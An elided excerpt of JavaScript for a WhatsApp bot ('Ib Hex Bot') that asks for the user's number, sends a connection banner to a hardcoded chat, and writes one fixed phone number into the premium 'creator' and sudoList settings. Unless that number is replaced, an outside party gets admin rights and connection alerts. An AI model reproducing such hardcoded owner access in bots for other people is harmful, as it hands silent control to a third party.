...
async function getUserNumber() {
    return new Promise((resolve) => {
        ...
        rl.question('📲 Enter your WhatsApp number (with country code, e.g., 224xxxx): ', (number) => {
            rl.close();
            resolve(number.trim());
        });
    });
...
async function connectToWhatsapp(handleMessage) {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if (connection === 'close') {
            ...
            try {
                const chatId = '224621963059@s.whatsapp.net'; // ton numéro ou le groupe cible
                ...
                const messageText = `
╔══════════════════╗
      *Ib Hex Bot Connected Successfully* 🚀
╠══════════════════╣
> "Always Forward. Ib hex bot, one of the best."
╚══════════════════╝
    ...
    setTimeout(async () => {
        if (!state.creds.registered) {
            ...
            try {
                ...
                const number = 224621963059; // mettez votre numéro WhatsApp 

                if (asPremium === true) {
                    configmanager.premiums.premiumUser['c'] = { creator: '224621963059' };
                    configmanager.saveP();
                ...
                setTimeout(() => {
                    configmanager.config.users[number] = {
                        sudoList: ['224621963059@s.whatsapp.net'], // emplace par ton numéro WhatsApp 
